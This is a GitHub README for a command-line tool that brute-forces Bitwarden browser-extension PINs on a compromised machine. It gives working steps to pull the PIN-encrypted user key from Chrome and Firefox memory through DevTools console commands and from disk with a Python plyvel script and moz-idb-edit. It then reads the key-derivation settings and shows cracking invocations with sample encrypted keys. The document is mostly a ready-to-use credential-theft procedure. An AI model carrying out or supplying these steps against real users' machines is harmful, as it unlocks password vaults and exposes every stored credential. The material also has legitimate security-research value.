# Bitwarden PIN Bruteforce

**Brute force any Bitwarden PIN from storage or in-memory**

<img align="right" width="300" src="https://github.com/JorianWoltjer/bitwarden-pin-bruteforce/assets/26067369/6f6cbfb1-793b-4eb9-b4be-6a10b72b7c69">

When the Bitwarden browser extension is installed on a compromised machine, it is often still locked and requires the master password to be entered to decrypt the data. There is an option however to lock the vault with a PIN instead of a password, either *always* or *only after the master password has been entered once*.

You can imagine that passwords must be less protected because the only thing required to unlock the vault now is a 4-digit number. It still works offline meaning that the decryption can always be replicated without limits to brute-force the PIN. While Bitwarden tries its best to make it slow to crack such a PIN, there are only 10000 options which can be done in a few minutes even for slow password hashes.

This tool implements such a brute force algorithm in a multi-threaded CLI tool with support for all kinds of hashes. Depending on the length of the PIN, and algorithms used, it can take from a handful of minutes to a few hours. But if you check the hashing configuration carefully and put it into this tool, you can be sure that the hash will be cracked sucessfully in every scenario.

## Installation

```Bash
cargo install bitwarden-pin
```

Or **download** and **extract** a pre-compiled binary from the [Releases](https://github.com/JorianWoltjer/bitwarden-pin-bruteforce/releases) page. 

## Example

[![Bitwarden PIN Bruteforce - Example](https://asciinema.org/a/xoLRMg0ATo3Y69EOlx3frri7X.svg)](https://asciinema.org/a/xoLRMg0ATo3Y69EOlx3frri7X?autoplay=1)

# Steps

## 1. Finding PIN-Encrypted User Key

The cracking technique will involve finding a config variable on disk or in memory. This depends on whether the checkbox was turned on and will be called either PERSISTANT for an unchecked box meaning the key is stored on disk, and TRANSIENT for a checked box meaning the key is stored in memory. ([source](https://github.com/bitwarden/clients/blob/8d528c2d4a73fadcc047da2448e02b324770e2f7/libs/common/src/services/vault-timeout/vault-timeout-settings.service.ts#L11-L16))

Disk storage is a common storage method that most extensions use. These can be read from specific files using tools made for the browser. Memory storage is simply an object that other parts of the extension can access and needs to be read interactively in a debugger.

### Google Chrome: In Memory (GUI)

1. Right-click the Bitwarden extension on the right of the address bar
2. Select **Inspect popup**:

![Chrome inspect extension popup in context menu](https://github.com/JorianWoltjer/bitwarden-pin-bruteforce/assets/26067369/608a49f2-f30e-4a3e-b9c9-4a4bc9a55a50)

3. In the new DevTools window, run the following JavaScript code in the Console:

```js
chrome.extension.getBackgroundPage().bitwardenMain.memoryStorageService.store.get("state").accounts
```

4. This will log an object containing all in-memory accounts with their properties. Collapse the properties with the arrows and look for `settings.pinKeyEncryptedUserKeyEphemeral`.

> [!TIP]
> In this same console you can also read the disk storage through the following API:
> 
> ```js
> chrome.extension.getBackgroundPage().bitwardenMain.stateService.accountDiskCache._value
> ```

### Firefox: In Memory (GUI)

 1. Put `about:debugging` into the address bar to visit the debug settings
 2. Click **This Firefox**
 3. On the Bitwarden Extension, click **Inspect**
 4. In the opened Developer Tools console, run the following JavaScript:

```js
bitwardenMain.memoryStorageService.store.get("state").accounts
```

Tip: In this same console you can also read the disk storage through the following API:

```js
bitwardenMain.stateService.accountDiskCache._value
```

### Google Chrome: On Disk

Check out https://bitwarden.com/help/data-storage/#on-your-local-machine for the locations where Browser extension data is stored for the target Operating System. On *Windows*, for example, this is at:  
`%LocalAppData%\Google\Chrome\User Data\Default\Local Extension Settings\nngceckbapebfimnlniiiahkandclblb`

Use the following Python script to read and dump the data:

```Python
import plyvel  # pip install plyvel
import json

BITWARDEN = r"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nngceckbapebfimnlniiiahkandclblb"

db = plyvel.DB(BITWARDEN)

activeUserId = json.loads(db.get(b"activeUserId"))
account = json.loads(db.get(activeUserId.encode()))

json.dump(account, open("account.json", "w"), indent=4, sort_keys=True)
```

In the created `account.json` file, find `settings.pinKeyEncryptedUserKey`. If this is empty, it may be an older version that used to be stored at `settings.pinProtected.encrypted`.

### Firefox: On Disk

Check out https://bitwarden.com/help/data-storage/#on-your-local-machine for the locations where Browser extension data is stored for the target Operating System. On *Windows*, for example, this is at:  
`%AppData%\Mozilla\Firefox\Profiles\[profile]\storage\default\moz-extension+++[UUID]^userContextId=[integer]`

There are some variables here that are different per system. `[profile]` can be found by just trying all the folders. `[UUID]` can be found at `about:debugging` in the Firefox address bar. Then press This Firefox and look for Internal UUID under the Bitwarden extension. This should be enough to find the path.  
Then the database file itself is stored at `\idb\3647222921wleabcEoxlt-eengsairo.sqlite` appended to it.

The [moz-idb-edit](https://gitlab.com/ntninja/moz-idb-edit) tool can be used to dump all data in a JSON format into a file:

```bash
pip install git+https://gitlab.com/ntninja/moz-idb-edit.git
moz-idb-edit --dbpath "C:\Users\user\AppData\Roaming\Mozilla\Firefox\Profiles\lm6vr7sd.default-release-1619096024431\storage\default\moz-extension+++b546b99d-f948-44ea-91e1-333828d5ac30^userContextId=4294967295\idb\3647222921wleabcEoxlt-eengsairo.sqlite" > account.json
```

## 2. Gathering the Cryprography Settings

While there are some default cryptography settings that the user key and pin are encrypted with, these have changed over time and can also be changed in the settings, so they may be different. To be sure you can check the Key Derivation Function (`kdf`) settings. `null` values are replaced with their defaults:

```Shell
$ jq . account.json | grep "kdf"

    "kdfType": 0,             # 0 = pbkdf2, 1 = argon2
    "kdfIterations": 100000,  # default: pbkdf2=600000, argon2=3
    "kdfMemory": null,        # default: argon2=64 (*1024 = 65536)
    "kdfParallelism": null,   # default: argon2=4
```

Source: https://github.com/bitwarden/clients/blob/main/libs/common/src/platform/enums/kdf-type.enum.ts

## 3. Cracking the PIN

When you find all the parameters and either the permanent or ephemeral key, you can brute force the PIN locally without the UI locking you out. Some basic implementations of this exist for older defaults, but I decided to make my own tool where you can pass all these parameters to crack it in an optimized and multithreaded program (this repository). Here are some examples:

Default settings (pbkdf2 with 600000 iterations), and email with `-m` for salt:

```bash
bitwarden-pin -e "2.P6TpPPpMf5zkHUfTplnocw==|KZ7/pR8ft+LwcjfXs2ym9hmxE7DLIeA9Kl+IPwTVCwLmbpkFtYKPWvK53DEDDrVUeYvz/rPcl3MEH3wXl200HCsV5ZbGLGVU4bha5Aw20fk=|+Y46Za3Oo63XRbvqLFz5cVuvbqMvBqopD16+8HV83mk=" \
              -m "tenire3448@fashlend.com"
```

Set custom iterations with `-i` to old version, will be 6x faster to crack:

```bash
bitwarden-pin -e "..." 
              -m "tenire3448@fashlend.com" pbkdf2 -i 100000
```

Set algorithm to newer argon2:

```bash
bitwarden-pin -e "2.FA4aPsq/5jKajc8tGqYKaQ==|CO/t9f1EQ4O5LL6O1anBAd1/4Hb+l4I32UMlW+3O7CoxTRXlEuLK5xvDCFmeRCYmylt206B22roFXycaRG3Z9fnN1aVVbBJ59qfCDEGusHw=|vmWmAb9kfqPPljRNhDMe+fDlwwat8XN5BZSsMAH8p8w=" \
              -m "tenire3448@fashlend.com" argon2
```

Set custom kdfConfig values for argon2 with `-i` for iterations, and `-m` for memory in MiB:

```bash
bitwarden-pin -e "2.FA4aPsq/5jKajc8tGqYKaQ==|CO/t9f1EQ4O5LL6O1anBAd1/4Hb+l4I32UMlW+3O7CoxTRXlEuLK5xvDCFmeRCYmylt206B22roFXycaRG3Z9fnN1aVVbBJ59qfCDEGusHw=|vmWmAb9kfqPPljRNhDMe+fDlwwat8XN5BZSsMAH8p8w=" \
              -m "tenire3448@fashlend.com" argon2 -i 3 -m 64 -p 6
```

Crack PIN at 100000 iterations with 6 digits (will take a long time):

```bash
bitwarden-pin -e "..." 
              -m "tenire3448@fashlend.com" pbkdf2 -i 100000 -p 6
```
